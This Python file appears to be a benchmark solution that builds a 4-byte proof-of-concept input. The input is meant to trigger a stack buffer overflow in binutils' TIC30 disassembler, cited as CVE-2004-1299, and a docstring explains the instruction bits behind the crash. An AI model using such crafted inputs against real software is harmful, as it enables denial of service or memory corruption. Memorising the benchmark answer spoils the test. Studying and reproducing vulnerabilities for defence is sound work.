import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a stack buffer overflow
        in the `tic30-dis` utility, specifically within the `print_branch` function.

        The vulnerability (CVE-2004-1299) exists in an older version of binutils
        where a fixed-size stack buffer `char operand[10]` is used to format a
        string representing parallel operations in a TIC30 instruction.

        A specially crafted branch instruction can cause the formatting logic to
        generate a string significantly longer than 10 bytes, leading to a stack
        buffer overflow.

        The PoC consists of a single 32-bit TIC30 instruction: 0x30ff0000.

        Breakdown of the instruction word:
        - 0x30______: This corresponds to the `BR` (Branch Delayed) instruction
          opcode. This instruction type calls the vulnerable `print_branch` function,
          and its opcode definition does not conflict with the other bits we need to set.
        - ____ff____: Bits 16-23 are set to 0xff.
          - Bit 23 being set triggers the code path that formats parallel operations.
          - Bits 16-22 serve as a mask, and setting them all to 1 causes the
            disassembler to generate the longest possible string of parallel
            operations (e.g., "STF||STF||STI||STI..."), which is 38 bytes long.
        - ________0000: The lower 16 bits are the displacement, which do not
          affect this specific overflow and can be set to zero.

        When the vulnerable `tic30-dis` attempts to disassemble this instruction, it
        writes the 38-byte string into the 10-byte `operand` buffer, overflowing it
        and corrupting the stack, which leads to a crash.

        The 32-bit instruction word is packed as little-endian bytes, which is the
        typical byte order for the TI C30 toolchain. This results in a 4-byte PoC.
        """
        
        instruction_word = 0x30ff0000
        
        # Pack the integer into 4 bytes, little-endian order.
        poc_bytes = struct.pack('<I', instruction_word)
        
        return poc_bytes